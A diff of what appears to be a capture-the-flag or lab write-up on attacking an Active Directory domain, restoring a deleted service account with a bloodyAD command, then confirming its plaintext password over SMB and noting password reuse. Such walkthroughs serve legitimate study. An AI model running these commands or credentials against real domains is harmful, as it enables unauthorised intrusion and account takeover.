@@ -744,7 +744,7 @@ I have write to two interesting non-default things, `OU=Legacy Service Compatibl
 
 Using these privs i might be able to restore the object into the `OU=Legacy Service Compatible Access,DC=trask,DC=hsm` OU
 
-# Restoring `svc_dcsecure_core`
+# Restoring and compromising `svc_dcsecure_core`
 
 ```python
 bloodyAD --host dc01.trask.hsm -d trask.hsm -u 'svc_dcsecure_agent' -p 'DCiZS3CureD1982#' -k set restore --newParent 'OU=Legacy Service Compatible Access,DC=trask,DC=hsm' 'CN=svc_dcsecure_core\0ADEL:a2b4e839-17b0-4798-a92d-59a65a347754,CN=Deleted Objects,DC=trask,DC=hsm'
@@ -760,4 +760,5 @@ SMB         dc01.trask.hsm  445    dc01             [*]  x64 (name:dc01) (domain
 SMB         dc01.trask.hsm  445    dc01             [+] trask.hsm\svc_dcsecure_core:DCiZS3CureD1982#
 ```
 
-This account uses 
+This account uses the same password as the agent account
+
